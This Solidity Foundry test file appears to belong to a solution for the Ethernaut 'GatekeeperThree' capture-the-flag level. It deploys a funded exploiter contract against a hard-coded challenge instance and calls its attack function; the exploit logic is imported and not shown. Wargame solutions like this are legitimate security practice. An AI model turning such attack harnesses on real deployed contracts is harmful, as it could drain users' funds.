// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/28-GatekeeperThree.sol";

contract GatekeeperThreeTest is Test {
    address from = vm.envAddress("ETH_FROM");
    IGatekeeperThree gatekeeperThreeInstance = IGatekeeperThree(0x70F28D714De9515Ec378eCAF523ADf3256ee7797);

    function setUp() public {}

    function test_attack() public {
        vm.startPrank(from, from);
        GatekeeperThree exploiter = new GatekeeperThree{value: 0.002 ether}(address(gatekeeperThreeInstance));
        exploiter.attack();
    }
}
